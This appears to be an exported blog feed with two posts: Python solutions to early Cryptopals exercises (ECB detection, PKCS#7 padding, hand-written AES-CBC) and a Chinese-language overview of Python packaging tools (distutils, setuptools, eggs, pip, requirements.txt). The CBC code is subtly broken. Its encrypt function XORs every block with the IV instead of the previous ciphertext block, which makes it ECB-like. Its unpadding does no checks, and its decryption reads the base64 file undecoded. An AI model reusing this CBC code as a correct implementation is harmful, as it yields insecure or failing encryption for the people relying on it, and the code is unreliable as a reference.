<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;8.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertexts = [unhexlify(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_repeated_blocks</span>(<span class="params">ciphertext, blocksize = <span class="number">16</span></span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ciphertext) % blocksize != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;ciphertext length is not a multiple of block size&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        num_blocks = <span class="built_in">len</span>(ciphertext) // blocksize</span><br><span class="line">        </span><br><span class="line">    blocks = [ciphertext[i*blocksize:(i+<span class="number">1</span>)*blocksize] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_blocks)]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(blocks)) != num_blocks:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">hits = [ciphertext <span class="keyword">for</span> ciphertext <span class="keyword">in</span> ciphertexts <span class="keyword">if</span> has_repeated_blocks(ciphertext)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hits)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [b&#x27;\xd8\x80a\x97@\xa8\xa1\x9bx@\xa8\xa3\x1c\x81\n=\x08d\x9a\xf7\r\xc0oO\xd5\xd2\xd6\x9ctL\xd2\x83\xe2\xdd\x05/kd\x1d\xbf\x9d\x11\xb04\x85B\xbbW\x08d\x9a\xf7\r\xc0oO\xd5\xd2\xd6\x9ctL\xd2\x83\x94u\xc9\xdf\xdb\xc1\xd4e\x97\x94\x9d\x9c~\x82\xbfZ\x08d\x9a\xf7\r\xc0oO\xd5\xd2\xd6\x9ctL\xd2\x83\x97\xa9&gt;\xab\x8dj\xec\xd5fH\x91Tx\x9ak\x03\x08d\x9a\xf7\r\xc0oO\xd5\xd2\xd6\x9ctL\xd2\x83\xd4\x03\x18\x0c\x98\xc8\xf6\xdb\x1f*?\x9c@@\xde\xb0\xabQ\xb2\x993\xf2\xc1#\xc5\x83\x86\xb0o\xba\x18j&#x27;]</span></span><br></pre></td></tr></table></figure>

<h2 id="Set-2"><a href="#Set-2" class="headerlink" title="Set 2"></a>Set 2</h2><h3 id="0x09-Implement-PKCS-7-padding"><a href="#0x09-Implement-PKCS-7-padding" class="headerlink" title="0x09 Implement PKCS#7 padding"></a>0x09 Implement PKCS#7 padding</h3><p>A block cipher transforms a fixed-sized block (usually 8 or 16 bytes) of plaintext into ciphertext. But we almost never want to transform a single block; we encrypt irregularly-sized messages.</p>
<p>One way we account for irregularly-sized messages is by padding, creating a plaintext that is an even multiple of the blocksize. The most popular padding scheme is called PKCS#7.</p>
<p>So: pad any block to a specific block length, by appending the number of bytes of padding to the end of the block. For instance,</p>
<blockquote>
<p>“YELLOW SUBMARINE”</p>
</blockquote>
<p>… padded to 20 bytes would be:</p>
<blockquote>
<p>“YELLOW SUBMARINE\x04\x04\x04\x04”</p>
</blockquote>
<p>solution:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span>(<span class="params">message, block_length</span>):</span></span><br><span class="line">    padding_length = block_length - (<span class="built_in">len</span>(message) % block_length)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> padding_length == <span class="number">0</span>:</span><br><span class="line">        padding_length = block_length</span><br><span class="line">    padding = <span class="built_in">bytes</span>([padding_length]) * padding_length</span><br><span class="line">    <span class="keyword">return</span> message + padding</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_padding</span>(<span class="params">message</span>):</span></span><br><span class="line">    padding_len = message[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> message[:-padding_len]</span><br><span class="line"></span><br><span class="line">message = <span class="string">b&#x27;YELLOW SUBMARINE&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(padding(message,<span class="number">20</span>))</span><br><span class="line"><span class="comment"># b&#x27;YELLOW SUBMARINE\x04\x04\x04\x04&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x0A-Implement-CBC-mode"><a href="#0x0A-Implement-CBC-mode" class="headerlink" title="0x0A Implement CBC mode"></a>0x0A Implement CBC mode</h2><p>CBC mode is a block cipher mode that allows us to encrypt irregularly-sized messages, despite the fact that a block cipher natively only transforms individual blocks.</p>
<p>In CBC mode, each ciphertext block is added to the next plaintext block before the next call to the cipher core.</p>
<p>The first plaintext block, which has no associated previous ciphertext block, is added to a “fake 0th ciphertext block” called the initialization vector, or IV.</p>
<p>Implement CBC mode by hand by taking the ECB function you wrote earlier, making it encrypt instead of decrypt (verify this by decrypting whatever you encrypt to test), and using your XOR function from the previous exercise to combine them.</p>
<p>The <a class="link"   href="https://cryptopals.com/static/challenge-data/10.txt" >file<i class="fas fa-external-link-alt"></i></a> here is intelligible (somewhat) when CBC decrypted against “YELLOW SUBMARINE” with an IV of all ASCII 0 (\x00\x00\x00 &amp;c)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> types <span class="keyword">import</span> DynamicClassAttribute</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"></span><br><span class="line">backend = default_backend()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_aes_128_block</span>(<span class="params">msg,key</span>):</span></span><br><span class="line">    cipher = Cipher(algorithms.AES(key),modes.ECB(),backend=backend)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    <span class="keyword">return</span> encryptor.update(msg) + encryptor.finalize()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_aes_128_block</span>(<span class="params">ctxt,key</span>):</span></span><br><span class="line">    cipher = Cipher(algorithms.AES(key),modes.ECB(),backend=backend)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    decrypted_data = decryptor.update(ctxt) + decryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_bytes_in_blocks</span>(<span class="params">x,blocksize</span>):</span></span><br><span class="line">    nb_blocks = ceil(<span class="built_in">len</span>(x)/blocksize)</span><br><span class="line">    <span class="keyword">return</span> [x[i * blocksize: (i+<span class="number">1</span>) * blocksize] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nb_blocks)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span>(<span class="params">message, block_length</span>):</span></span><br><span class="line">    padding_length = block_length - (<span class="built_in">len</span>(message) % block_length)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> padding_length == <span class="number">0</span>:</span><br><span class="line">        padding_length = block_length</span><br><span class="line">    padding = <span class="built_in">bytes</span>([padding_length]) * padding_length</span><br><span class="line">    <span class="keyword">return</span> message + padding</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_padding</span>(<span class="params">message</span>):</span></span><br><span class="line">    padding_len = message[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> message[:-padding_len]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a,b)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_aes_128_cbc</span>(<span class="params">msg,iv,key</span>):</span></span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    previous_ctxt_block = iv</span><br><span class="line">    paddedtxt = padding(msg,<span class="number">16</span>)</span><br><span class="line">    blocks = split_bytes_in_blocks(paddedtxt,<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        to_encrypt = bxor(iv,block)</span><br><span class="line">        cipher = encrypt_aes_128_block(to_encrypt,key)</span><br><span class="line">        res += cipher</span><br><span class="line">        previous_ctxt_block = cipher</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_aes_128_cbc</span>(<span class="params">ctxt,iv,key</span>):</span></span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    previous_ctxt_block = iv</span><br><span class="line">    blocks = split_bytes_in_blocks(ctxt, <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        to_decrypt = decrypt_aes_128_block(block, key)</span><br><span class="line">        res += bxor(to_decrypt, previous_ctxt_block)</span><br><span class="line">        previous_ctxt_block = block</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> restore_padding(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;10.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = <span class="built_in">bytes</span>(f.read().encode())</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">key = <span class="string">b&#x27;YELLOW SUBMARINE&#x27;</span></span><br><span class="line">res = decrypt_aes_128_cbc(data, iv, key)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Python包管理工具小记</title>
    <url>/2021/12/09/Python%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Python包管理工具小记"><a href="#Python包管理工具小记" class="headerlink" title="Python包管理工具小记"></a>Python包管理工具小记</h1><p>python的源码包与二进制包</p>
<blockquote>
<p>源码包：源码包安装的过程，是先解压，再编译，最后才安装，所以它是跨平台的，由于每次安装都要进行编译，相对二进包安装方式来说安装速度较慢。源码包的本质是一个压缩包，其常见的格式有.zip，.tar，.gz，.bz2，.Z</p>
</blockquote>
<blockquote>
<p>二进制包：二进制包的安装过程省去了编译的过程，直接进行解压安装，所以安装速度较源码包来说更快。由于不同平台的编译出来的包无法通用，所以在发布时，需事先编译好多个平台的包。二进制包的常见格式有.egg，.whl</p>
</blockquote>
<h2 id="包管理工具"><a href="#包管理工具" class="headerlink" title="包管理工具"></a>包管理工具</h2><p>以下对这些包管理工具按时间顺序进行介绍</p>
<h3 id="distutils"><a href="#distutils" class="headerlink" title="distutils"></a>distutils</h3><p><code>distutils</code>是<code>python</code>标准库的一部分，2000年发布。使用它能够进行<code>python</code>模块的安装和发布。<br><code>setup.py</code>就是利用<code>distutils</code>的功能写成。<br>关于<code>setup.py</code>所有格式的详细描述：<a class="link"   href="https://docs.python.org/3/distutils/setupscript.html" >Writing the Setup Script<i class="fas fa-external-link-alt"></i></a></p>
<p>安装方式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<p>不同的打包命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python setup.py sdist --formats=gztar,<span class="built_in">zip</span></span><br></pre></td></tr></table></figure>
<p>其他可用格式</p>
<table>
<thead>
<tr>
<th>Format</th>
<th>Description</th>
<th>Notes</th>
</tr>
</thead>
<tbody><tr>
<td>zip</td>
<td>zip file(.zip)</td>
<td>(1),(3)</td>
</tr>
<tr>
<td>gztar</td>
<td>gzip’ed tar file (.tar.gz)</td>
<td>(2)</td>
</tr>
<tr>
<td>bztar</td>
<td>bzip2’ed tar file (.tar.bz2)</td>
<td></td>
</tr>
<tr>
<td>xztar</td>
<td>xz’ed tar file (.tar.xz)</td>
<td></td>
</tr>
<tr>
<td>ztar</td>
<td>compressed tar file (.tar.Z)</td>
<td>(4)</td>
</tr>
<tr>
<td>tar</td>
<td>tar file (.tar)</td>
<td></td>
</tr>
</tbody></table>
<p>Notes:</p>
<ol>
<li>default on Windows</li>
<li>default on Unix</li>
<li>requires either external zip utility or zipfile module (part of the standard Python library since Python 1.6)</li>
<li>requires the compress program. Notice that this format is now pending for deprecation and will be removed in the future versions of Python.</li>
</ol>
<h3 id="setuptools-和-distribute"><a href="#setuptools-和-distribute" class="headerlink" title="setuptools 和 distribute"></a>setuptools 和 distribute</h3><p><code>setuptools</code>是一个为了增强<code>distutils</code>而开发的集合，2004年发布。它包含了<code>easy_install</code>这个工具。<br><code>ez_setup.py</code>是<code>setuptools</code>的安装工具。<code>ez</code>就是<code>easy</code>的缩写。</p>
<p><code>setuptools</code>是一个项目的名称，是基础组件。而<code>easy_install</code>是这个项目中提供的工具，它依赖基础组件工作。</p>
<p>下文中提到的<code>setuptools</code>被认为与<code>easy_install</code>同义。<br>例子来源于<a class="link"   href="http://peak.telecommunity.com/DevCenter/EasyInstall" >此处<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>Example 1.</strong> Install a package by name, searching PyPI for the <strong>latest</strong> version, and automatically downloading, building, and installing it(ps:高版本依赖问题)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">easy_install SQLObject</span><br></pre></td></tr></table></figure>

<p><strong>Example 2.</strong> Install or upgrade a package by name and version by finding links on a given “download page”:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">easy_install -f http:&#x2F;&#x2F;pythonpaste.org&#x2F;package_index.html SQLObject</span><br></pre></td></tr></table></figure>
<p><strong>Example 3.</strong> Download a source distribution from a specified URL, automatically building and installing it:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">easy_install http:&#x2F;&#x2F;example.com&#x2F;path&#x2F;to&#x2F;MyPackage-1.2.3.tgz</span><br></pre></td></tr></table></figure>
<p><strong>Example 4.</strong> Install an already-downloaded .egg file:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">easy_install &#x2F;my_downloads&#x2F;OtherPackage-3.2.1-py2.3.egg</span><br></pre></td></tr></table></figure>


<p><code>distribute</code>是<code>setuptools</code>的一个分支版本。分支的原因可能是有一部分开发者认为<code>setuptools</code>开发太慢了。但现在<code>distribute</code>又合并回了<code>setuptools</code>中。因此，我们可以认为它们是同一个东西。事实上，如果你查看一下<code>easy_install</code>的版本，会发现它本质上就是<code>distribute</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># easy_install --version</span><br><span class="line">distribute 0.6.28</span><br></pre></td></tr></table></figure>

<h3 id="Eggs"><a href="#Eggs" class="headerlink" title="Eggs"></a>Eggs</h3><p><code>Eggs</code>格式是<code>setuptools</code>引入的一种文件格式，它使用<code>.egg</code>扩展名，用于<code>Python</code>模块的安装。</p>
<blockquote>
<p>Eggs are to Pythons as Jars are to Java..</p>
</blockquote>
<p><code>eggs</code>通过将一些额外的信息与<code>Python</code>项目绑定在一起，使得整个项目的依赖项在运行时能够得到满足，同时允许项目能够为其他项目提供扩展功能。有几种二进制格式可以体现<code>egg</code>，但最常见的是<code>.egg</code>压缩文件格式，因为它是一种较为方便的发布项目的格式。所有的格式都支持包括包的特定数据、项目范围的元数据、<code>C Extensions</code>和Python代码。</p>
<p>其安装方法即为上文所提到的<code>easy install</code>。</p>
<p>some benefits：</p>
<blockquote>
<p>They enable tools like the “Easy Install” Python package manager</p>
</blockquote>
<blockquote>
<p>.egg files are a “zero installation” format for a Python package; no build or install step is required, just put them on PYTHONPATH or sys.path and use them <strong>(may require the runtime installed if C extensions or data files are used)</strong></p>
</blockquote>
<blockquote>
<p>They can include package metadata, such as the other eggs they depend on</p>
</blockquote>
<blockquote>
<p>They allow “namespace packages” (packages that just contain other packages) to be split into separate distributions (e.g. zope.<em>, twisted.</em>, peak.* packages can be distributed as separate eggs, unlike normal packages which must always be placed under the same parent directory. This allows what are now huge monolithic packages to be distributed as separate components.)</p>
</blockquote>
<blockquote>
<p>They allow applications or libraries to specify the needed version of a library, so that you can e.g. require(“Twisted-Internet&gt;=2.0”) before doing an import twisted.internet.</p>
</blockquote>
<p><del>(ps:<code>.whl</code>同理？但是依赖项又是如何check的呢？</del></p>
<h4 id="使用eggs"><a href="#使用eggs" class="headerlink" title="使用eggs"></a>使用eggs</h4><p>如果我们安装的是一个纯粹的<code>python</code> <code>.egg</code>文件，并且不使用任何包内数据文件（这里有点没理解），并且不介意手动将包移动到<code>sys.path</code>或<code>PYTHONPATH</code>时，我们就可以不安装<code>setuptools</code>并进行安装。</p>
<p>但是对于那些比如包含<code>C Extensions</code>的文件，或者那些需要访问非<code>python</code>数据的包内文件（打包在<code>.egg</code>种的文件，如README.md，这下前面的部分理解了），就必须要使用<code>setuptools</code>中的<code>pkg_resources</code>模块安装了！</p>
<p>除了为使用包含<code>C Extensions</code>或数据文件的提供运行时支持外，<code>pkg_resources</code>模块还提供了一个 API，用于自动定位<code>egg</code>及其依赖关系，并在运行时将其添加到<code>sys.path</code>中。(详见 <a class="link"   href="http://peak.telecommunity.com/DevCenter/PkgResources" >API<i class="fas fa-external-link-alt"></i></a> 文档和 <a class="link"   href="http://peak.telecommunity.com/DevCenter/PkgResources" >setuptools<i class="fas fa-external-link-alt"></i></a> 文档)。</p>
<p>如此情况我们可以安装一个包的不同版本，只要我们在运行时能够自动选择正确的版本。如果某个依赖错误，则会抛出<code>DistributionNotFound</code>异常，告知需要的包及其版本。</p>
<p>那么如何判断纯<code>python</code>的<code>.egg</code>文件和那些包含<code>C Extensions</code>的<code>.egg</code>文件呢？答案是我们可以通过包名来判断，纯<code>.egg</code>文件往往是平台独立的，而那些包含<code>C Extensions</code>的文件则会在其文件名末尾上带上目标平台名。如果使用<code>pkg_resources</code>运行时自动查找包，它会忽略掉那些和我们的平台不兼容的<code>eggs</code>。如果我们不使用的话，就需要自己留意<code>egg</code>是否兼容了。</p>
<p>当我们安装了我们的<code>egg</code>文件后，就需要将它添加到<code>sys.path</code>了。我们可以手动完成这个过程，在<code>PYTHONPATH</code>环境变量处添加，或者我们在代码中将他们呢添加到<code>sys.path</code>。长远来看，手动安装显然不是一个好的策略。</p>
<h4 id="自动查找"><a href="#自动查找" class="headerlink" title="自动查找"></a>自动查找</h4><p>一种好的管理策略是我们将这些包放置到一个已经添加到<code>sys.path</code>的目录下，比如<code>site-packages</code>，或者一些我们自己手动添加到<code>PYTHONPATH</code>和<code>sys.path</code>的目录。</p>
<p>看下面一串代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pkg_resources <span class="keyword">import</span> require</span><br><span class="line">require(<span class="string">&quot;FooBar&gt;=1.2&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这个代码会在<code>sys.path</code>的所有目录中查找名叫<code>FooBar</code>并且版本号大于<code>1.2</code>的<code>egg</code>，并且自动匹配最新的版本，连同FooBar需要的任意<code>eggs</code>。</p>
<p><code>require</code>查找方式对大小写不敏感。</p>
<p>当我们想提供一些额外的可选功能时，这时候可能就需要定位并且将一些额外的<code>egg</code>文件添加到<code>sys.path</code>。例如，<code>FooBarWeb</code>web框架可能提供可选的<code>FastCGI</code>支持，我们就可以使用<code>(&quot;require[FastCGI] &gt;= 1.0&quot;)</code>来查找了，这样这些额外的包就可以被添加到<code>sys.path</code>。（没有找到抛出<code>pkg_resources.DistributionNotFound</code>异常）</p>
<p><strong>在<code>EGG-INFO/depends.txt</code>文件中记录了<code>egg</code>需要与可选的依赖项</strong></p>
<p><strong>Note:</strong> <code>pkg_resources</code>不会在PyPI上自动查找<code>eggs</code>文件或者从某个地方进行下载，它们必须是可以在<code>sys.path</code>目录下可用的<code>eggs</code>，但是我们可以捕获这个错误并且**自动从PyPI或者任何地方下载这些<code>eggs</code>**。要想自动安装这些依赖我们就可以利用一些工具了，如<code>EasyInstall</code>，<code>setuptools</code>需要被用于build<code>eggs</code>。</p>
<h4 id="Build-eggs"><a href="#Build-eggs" class="headerlink" title="Build eggs"></a>Build <code>eggs</code></h4><p>如果我们从<code>setup.py</code> build <code>egg</code>就需要安装<code>setuptools</code>了。</p>
<p>添加目标包的<code>setup</code>文件，添加<code>from setuptools import setup</code>使其能够替代现有导入的<code>setup</code>函数，然后运行<code>setup.py bdist_egg</code>。</p>
<p>然后一个<code>.egg</code>文件会被放在<code>dist</code>目录下，静静等待下一次使用。如果想添加一些特殊的元数据文件，可以在<code>SomePackage.egg-info</code>目录下添加（由<code>bdist_egg</code>创建，<code>SomePackage</code>即为我们安装的包名）。那些被放在该目录下的文件会被拷贝到<code>egg</code>文件的<code>EGG-INFO</code>目录下，以便在运行时使用。其他元数据文件会自动生成，不需要编辑。下次执行<code>setup</code>时会被自动<code>overwrite</code>。</p>
<h4 id="声明依赖"><a href="#声明依赖" class="headerlink" title="声明依赖"></a>声明依赖</h4><p>然而，库并不总可以调用<code>require()</code>，而且在任何情况下，库的源代码很少是声明其版本依赖关系的地方。所以<code>setuptools</code>允许我们在项目的<code>setup</code>中声明依赖关系，这样它们就会被绑定在<code>egg</code>的元数据目录中，然后运行时和<code>EasyInstall</code>可以自动找到所需的额外<code>eggs</code>，当项目被安装或在运行时通过<code>require()</code>将它们加入到<code>sys.path</code> 中。</p>
<blockquote>
<p>So far, we’ve only covered how to use eggs that have actually been installed, by building them with the distutils and then putting them in a directory on sys.path. </p>
</blockquote>
<p>更多详细信息参见此处<a class="link"   href="http://peak.telecommunity.com/DevCenter/PythonEggs#id6" >The Quick Guide to Python Eggs<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><p>从这里开始，<code>easy_install</code>和<code>setuptools</code>不再同义</p>
<p><code>pip</code>是目前<code>python</code>包管理的事实标准，2008年发布。它被用作 <code>easy_install</code>的替代品，但是它仍有大量的功能建立在<code>setuptools</code>组件之上。</p>
<p><code>pip</code>希望不再使用<code>Eggs</code>格式（虽然它支持<code>Eggs</code>），而更希望采用“源码发行版”（使用<code>python setup.py sdist</code>创建）。这可以充分利用<a class="link"   href="https://pip.pypa.io/en/latest/cli/pip_install/" >Requirements File Format<i class="fas fa-external-link-alt"></i></a>提供的方便功能。</p>
<p><code>pip</code>可以利用<code>requirments.txt</code>来实现在依赖的安装。在<code>setup.py</code>中，也存在一个<code>install_requires</code>表来指定依赖的安装。它们的区别在哪里？</p>
<h4 id="setup-py-VS-requirements-txt"><a href="#setup-py-VS-requirements-txt" class="headerlink" title="setup.py VS requirements.txt"></a>setup.py VS requirements.txt</h4><h5 id="Python库"><a href="#Python库" class="headerlink" title="Python库"></a>Python库</h5><p>这里的Python库指代一个开发出来供他人使用而发布的包，在<a class="link"   href="https://pypi.python.org/pypi" >PyPI<i class="fas fa-external-link-alt"></i></a>中我们可以找到很多的样例。在<code>setup.py</code>中包含了一个库的基本信息。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name=<span class="string">&quot;MyLibrary&quot;</span>,</span><br><span class="line">    version=<span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">    install_requires=[</span><br><span class="line">        <span class="string">&quot;requests&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bcrypt&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>这样就很简单声明了<code>Python</code>库的一些信息，但是并没有显式提供一个<code>url</code>来获取这些依赖，仅告诉了我们依赖是什么。我们可以称这种声明方式为“抽象的依赖”，它们只是以名字（或者加上了一个具体的版本号） 的方式来出现的。这就像我们说的“鸭子类型”，你不在乎它是什么样子的只要它看起来是<code>requests</code>。</p>
<blockquote>
<p><a class="link"   href="https://cloud.tencent.com/developer/article/1484390" >鸭子类型<i class="fas fa-external-link-alt"></i></a>（duck typing）在程序设计中是动态类型的一种风格。 在这种风格中，一个对象有效的语义，不是由继承自特定的类或实现特定的接口，而是由”当前方法和属性的集合”决定。</p>
</blockquote>
<h5 id="Python应用"><a href="#Python应用" class="headerlink" title="Python应用"></a>Python应用</h5><p>这里的Python应用指我们要部署的一些东西，区别于前面的<code>Python</code>库。Python应用中往往会在应用外放至一个文件用于声明该应用部署所需的依赖。</p>
<p>一个应用往往会有许多依赖。通常由requirements来对它们进行声明。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># This is an implicit value, here for clarity</span><br><span class="line">--index https:&#x2F;&#x2F;pypi.python.org&#x2F;simple&#x2F;</span><br><span class="line"></span><br><span class="line">MyPackage&#x3D;&#x3D;1.0</span><br><span class="line">requests&#x3D;&#x3D;1.2.0</span><br><span class="line">bcrypt&#x3D;&#x3D;1.0.2</span><br></pre></td></tr></table></figure>
<p>文件的头部有一个 <code>--index https://pypi.python.org/simple/</code> ，一般我们不需要声明这项，除非我们使用的不是PyPI。</p>
<p>这一行把一个抽象的依赖声明<code>requests==1.2.0</code>转变为一个具体的依赖声明<code>requests 1.2.0 from pypi.python.org/simple/</code>，这不像“鸭子类型”，倒像一次<code>isinstance</code>检查。</p>
<h5 id="抽象与具体"><a href="#抽象与具体" class="headerlink" title="抽象与具体"></a>抽象与具体</h5><p>对于抽象依赖和具体依赖的区分是非常重要的，这点使我们的<code>PyPI</code>镜像源正常工作，这点允许我们可以在公司里搭建我们私有的包索引服务，甚至这点允许了你去fork一个包并改造它。因为一个抽象的依赖只是一个名字和一个可选的版本号，你可以从<code>PyPi</code>来安装它，或者从你自己的文件系统，你可以fork它并改造它，只要你指明了正确的名字和版本号你就可以一直这么使用下去。</p>
<p>然而当我们在一个该使用抽象依赖的地方使用了具体依赖，就可能出现问题。当我们替换一个底层依赖的时候，还需要改动依赖这个库的其他依赖对该库的依赖声明。</p>
<h5 id="Setuptools的dependcy-links"><a href="#Setuptools的dependcy-links" class="headerlink" title="Setuptools的dependcy_links"></a>Setuptools的dependcy_links</h5><p>在<code>Setuptools</code>中有一个参数是<code>dependency_link</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from setuptools import setup</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    # ...</span><br><span class="line">    dependency_links &#x3D; [</span><br><span class="line">        &quot;http:&#x2F;&#x2F;packages.example.com&#x2F;snapshots&#x2F;&quot;,</span><br><span class="line">        &quot;http:&#x2F;&#x2F;example2.com&#x2F;p&#x2F;bar-1.0.tar.gz&quot;,</span><br><span class="line">    ],</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>这一功能除去了依赖的抽象特性，直接把依赖的获取url标在了setup.py里。就像在Go语言中修改依赖包一样，我们只需要修改依赖链中每个包的<code>dependency_links</code>。</p>
<h5 id="开发可复用的包与不重复自己"><a href="#开发可复用的包与不重复自己" class="headerlink" title="开发可复用的包与不重复自己"></a>开发可复用的包与不重复自己</h5><p>那么我们写依赖声明的时候需要在 setup.py 中写好抽象依赖，在 <code>requirements.txt</code>中写好具体的依赖，但是我们并不想维护两份依赖文件，这样会让我们很难做好同步。编写好<code>requirements.txt</code>可以解决这个问题，我们可以在有<code>setup.py</code>的目录里写下一个这样的 requirements.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--index https:&#x2F;&#x2F;pypi.python.org&#x2F;simple&#x2F;</span><br><span class="line"></span><br><span class="line">-e .</span><br></pre></td></tr></table></figure>
<p>这样<code>pip install -r requirements.txt</code>可以照常工作，它会先安装该文件路径下的包，然后继续开始解析抽象依赖(setup.py内的依赖)，结合<code>--index</code>选项后转换为具体依赖然后再进行安装。</p>
<p>这个办法可以让我们解决一种类似这样的情形：比如我们有两个或两个以上的包在一起开发但是是分开发行的，或者说你有一个尚未发布的包并把它分成了几个部分。如果你的顶层的包依然仅仅按照“名字”来依赖的话，我们依然可以使用<code>requirements.txt</code>来安装开发版本的依赖包:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--index https:&#x2F;&#x2F;pypi.python.org&#x2F;simple&#x2F;</span><br><span class="line"></span><br><span class="line">-e https:&#x2F;&#x2F;github.com&#x2F;foo&#x2F;bar.git#egg&#x3D;bar</span><br><span class="line">-e .</span><br></pre></td></tr></table></figure>
<p>这会首先从<code>https://github.com/foo/bar.git</code>来安装包<code>bar</code>， 然后进行到第二行<code>-e .</code>，开始安装<code>setup</code>中的抽象依赖，但是包<code>bar</code>已经安装过了， 所以<code>pip</code>会跳过安装，而是仍然使用<code>github.com</code>上安装了的开发版本的包<code>bar</code>。</p>
